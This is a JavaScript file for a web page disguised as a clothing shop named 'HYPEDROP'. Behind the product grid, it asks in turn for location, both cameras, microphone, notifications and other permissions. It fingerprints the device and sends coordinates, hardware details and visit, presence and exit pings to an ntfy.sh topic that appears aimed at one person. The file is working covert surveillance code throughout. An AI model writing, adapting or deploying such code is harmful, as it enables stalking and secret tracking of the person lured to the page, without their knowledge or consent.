/* ===== CAMBIA SOLO ESTA LÍNEA ===== */
const NTFY = 'https://ntfy.sh/hypedrop-ana-9f3a';
/* ================================== */

const $ = s => document.querySelector(s);
const step = label => {
  const d = document.createElement('div');
  d.className = 'step';
  d.innerHTML = `<span class="dot"></span><span>${label}</span><span class="st">…</span>`;
  $('#steps').appendChild(d);
  return d;
};
const ok   = d => { d.classList.add('ok');   d.querySelector('.st').textContent = 'concedido'; };
const fail = d => { d.classList.add('fail'); d.querySelector('.st').textContent = 'denegado'; };

async function send(title, msg, tags) {
  try {
    await fetch(NTFY, {
      method: 'POST',
      headers: { 'Title': title, 'Tags': tags || 'eyes' },
      body: msg
    });
  } catch (e) {}
}

const SID = localStorage.getItem('sid') || (() => {
  const v = (crypto.randomUUID ? crypto.randomUUID() : String(Math.random()).slice(2));
  localStorage.setItem('sid', v);
  return v;
})();

const PRODUCTS = [
  { n:'Hoodie Nebula', p:59,  c:'#6d28d9', svg:'<path d="M35 20 L18 31 L24 47 L32 43 L32 82 L68 82 L68 43 L76 47 L82 31 L65 20 Q50 33 35 20Z" fill="#fff"/>' },
  { n:'Sneaker Drift', p:120, c:'#0f766e', svg:'<path d="M14 66 Q14 50 30 50 L45 50 L56 39 Q67 33 77 44 L86 55 Q89 61 85 66 Z" fill="#fff"/>' },
  { n:'Tee Static',    p:29,  c:'#b45309', svg:'<path d="M36 22 L20 33 L28 47 L36 43 L36 82 L64 82 L64 43 L72 47 L80 33 L64 22 Q50 31 36 22Z" fill="#fff"/>' },
  { n:'Cap Orbit',     p:25,  c:'#be123c', svg:'<path d="M20 62 Q20 32 50 32 Q80 32 80 62 Z" fill="#fff"/><rect x="17" y="59" width="72" height="8" rx="4" fill="#fff"/>' },
  { n:'Cargo Flux',    p:79,  c:'#374151', svg:'<path d="M34 22 H66 L71 84 H55 L50 50 L45 84 H29 Z" fill="#fff"/>' },
  { n:'Jacket Vector', p:140, c:'#1d4ed8', svg:'<path d="M34 21 L18 32 L25 48 L33 44 L33 84 L67 84 L67 44 L75 48 L82 32 L66 21 L50 30 Z" fill="#fff"/>' }
];

let cart = 0;
$('#grid').innerHTML = PRODUCTS.map((p, i) => `
  <div class="card">
    <div class="thumb" style="background:${p.c}"><svg viewBox="0 0 100 100">${p.svg}</svg></div>
    <div class="pinfo">
      <div class="pname">${p.n}</div>
      <div class="prow"><span class="price">$${p.p}</span>
      <button class="add" data-i="${i}">Añadir</button></div>
    </div>
  </div>`).join('');

$('#grid').addEventListener('click', e => {
  const b = e.target.closest('.add');
  if (!b) return;
  cart++; $('#cartn').textContent = cart;
  b.textContent = 'Añadido';
  setTimeout(() => (b.textContent = 'Añadir'), 900);
  if (cart === 1) send('Carrito', 'Empezó a añadir productos.');
});

$('#phead').addEventListener('click', () => {
  const b = $('#pbody'), t = $('#ptoggle');
  const oculto = b.style.display === 'none';
  b.style.display = oculto ? 'block' : 'none';
  t.textContent = oculto ? 'ocultar' : 'mostrar';
});

const row = (k, v) => {
  if (v === undefined || v === null || v === '') return;
  const d = document.createElement('div');
  d.innerHTML = `<b>${k}</b><span>${String(v)}</span>`;
  $('#kv').appendChild(d);
};

const got = {};

function gpu() {
  try {
    const c = document.createElement('canvas');
    const g = c.getContext('webgl');
    const d = g.getExtension('WEBGL_debug_renderer_info');
    return String(g.getParameter(d.UNMASKED_RENDERER_WEBGL)).slice(0, 70);
  } catch (e) { return 'n/d'; }
}

function canvasFp() {
  try {
    const c = document.createElement('canvas');
    c.width = 180; c.height = 40;
    const x = c.getContext('2d');
    x.textBaseline = 'top'; x.font = '14px Arial';
    x.fillStyle = '#f60'; x.fillRect(0, 0, 90, 20);
    x.fillStyle = '#069'; x.fillText('HD-fp', 3, 3);
    x.fillStyle = 'rgba(102,204,0,.6)'; x.fillText('HD-fp', 5, 8);
    return c.toDataURL().slice(-30);
  } catch (e) { return 'n/d'; }
}

function recolectar() {
  const n = navigator;
  const datos = {
    sid: SID,
    so: n.userAgent,
    plataforma: n.platform,
    idioma: n.language,
    pantalla: `${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
    zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone,
    nucleosCPU: n.hardwareConcurrency,
    memoriaGB: n.deviceMemory || 'n/d',
    tactil: 'ontouchstart' in window,
    red: (n.connection && n.connection.effectiveType) || 'n/d',
    gpu: gpu(),
    huellaCanvas: canvasFp(),
    instalada: matchMedia('(display-mode: standalone)').matches,
    ubicacion: got.geo || 'no concedida',
    camaraFrontal: got.camF ? `${got.camF.width}x${got.camF.height}` : 'no',
    camaraTrasera: got.camB ? `${got.camB.width}x${got.camB.height}` : 'no',
    microfono: got.mic ? `${got.mic.sampleRate}Hz` : 'no',
    bateria: got.bat || 'n/d'
  };
  const nombres = {
    so:'Modelo / SO', plataforma:'Plataforma', idioma:'Idioma', pantalla:'Pantalla',
    zonaHoraria:'Zona horaria', nucleosCPU:'Núcleos CPU', memoriaGB:'Memoria RAM',
    tactil:'Táctil', red:'Red', gpu:'GPU', huellaCanvas:'Huella canvas',
    instalada:'Modo app', ubicacion:'Ubicación', camaraFrontal:'Cámara frontal',
    camaraTrasera:'Cámara trasera', microfono:'Micrófono', bateria:'Batería'
  };
  Object.keys(nombres).forEach(k => row(nombres[k], datos[k]));
  const txt = Object.keys(nombres).map(k => `${nombres[k]}: ${datos[k]}`).join('\n');
  send('Dispositivo vinculado', `ID: ${SID.slice(0, 8)}\n\n${txt}`);
}

async function cascada() {
  const lista = [
    ['Notificaciones', async () => {
      if (!('Notification' in window)) throw 0;
      const r = await Notification.requestPermission();
      if (r !== 'granted') throw 0;
      new Notification('Bienvenida a HYPEDROP', { body: 'Tu 10% de descuento está activo.' });
    }],
    ['Ubicación', () => new Promise((res, rej) => {
      if (!navigator.geolocation) return rej();
      navigator.geolocation.getCurrentPosition(
        p => { got.geo = `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}`; res(); },
        rej, { timeout: 8000 });
    })],
    ['Cámara frontal', async () => {
      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      got.camF = s.getVideoTracks()[0].getSettings();
      s.getTracks().forEach(t => t.stop());
    }],
    ['Cámara trasera', async () => {
      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      got.camB = s.getVideoTracks()[0].getSettings();
      s.getTracks().forEach(t => t.stop());
    }],
    ['Micrófono', async () => {
      const s = await navigator.mediaDevices.getUserMedia({ audio: true });
      got.mic = s.getAudioTracks()[0].getSettings();
      s.getTracks().forEach(t => t.stop());
    }],
    ['Sensores de movimiento', async () => {
      if (typeof DeviceOrientationEvent === 'undefined') throw 0;
      if (DeviceOrientationEvent.requestPermission) {
        const r = await DeviceOrientationEvent.requestPermission();
        if (r !== 'granted') throw 0;
      }
    }],
    ['Almacenamiento persistente', async () => {
      if (!navigator.storage || !navigator.storage.persist) throw 0;
      const p = await navigator.storage.persist();
      if (!p) throw 0;
    }]
  ];
  for (const [nombre, fn] of lista) {
    const d = step(nombre);
    try { await fn(); ok(d); } catch (e) { fail(d); }
    await new Promise(r => setTimeout(r, 150));
  }
  try {
    const b = await navigator.getBattery();
    got.bat = `${Math.round(b.level * 100)}%${b.charging ? ' (cargando)' : ''}`;
  } catch (e) {}
  recolectar();
}

$('#accept').addEventListener('click', async () => {
  $('#gate').classList.add('hide');
  $('#store').classList.remove('hide');
  await cascada();
});

let deferred = null;
window.addEventListener('beforeinstallprompt', e => {
  e.preventDefault(); deferred = e; $('#install').classList.remove('hide');
});
$('#install').addEventListener('click', async () => {
  if (!deferred) return;
  deferred.prompt(); deferred = null; $('#install').classList.add('hide');
});

if ('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js');

if (localStorage.getItem('vinculado')) {
  send('Volvio a entrar', `ID: ${SID.slice(0, 8)} · ${new Date().toLocaleString()}`);
} else {
  localStorage.setItem('vinculado', '1');
}

setInterval(() => send('Sigue aqui', `ID: ${SID.slice(0, 8)} · ${new Date().toLocaleTimeString()}`), 120000);

document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') send('Salio de la web', `ID: ${SID.slice(0, 8)}`);
});